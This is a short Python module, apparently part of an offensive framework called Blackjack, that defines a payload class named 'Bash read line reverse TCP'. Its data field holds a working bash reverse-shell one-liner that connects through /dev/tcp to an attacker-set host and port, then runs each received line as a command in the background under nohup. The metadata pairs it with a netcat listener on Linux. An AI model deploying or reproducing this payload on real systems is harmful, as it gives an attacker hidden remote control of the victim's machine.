# This module is part of the Blackjack framework

class Payload:

    info = {
        'Title' : 'Bash read line reverse TCP',
        'Author' : 'r0jahsm0ntar1',
        'Description' : 'Bash read line reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'bash-read-line',
        'os' : 'linux'  
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "nohup `exec 5<>/dev/tcp/*LHOST*/*LPORT*;cat <&5 | while read line; do $line 2>&5 >&5; done` &"
